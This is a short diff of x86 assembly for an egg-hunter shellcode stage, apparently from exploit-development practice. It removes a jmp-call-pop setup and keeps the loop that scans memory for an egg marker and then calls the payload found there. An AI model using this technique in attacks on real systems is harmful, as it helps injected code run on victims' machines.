@@ -28,11 +28,6 @@ global _start
 
 
 _start:
-	jmp short huntersEnd
-
-continue:
-	pop eax		; Now EAX points at hunters End
-
 	; Searching for the Egg marker
 next:
 	inc eax		; Searching forward  (can also try dec eax)
@@ -43,6 +38,3 @@ isEgg:
 	jne next
 
 	call eax			; Once found, we call our payload
-
-huntersEnd:
-	call continue
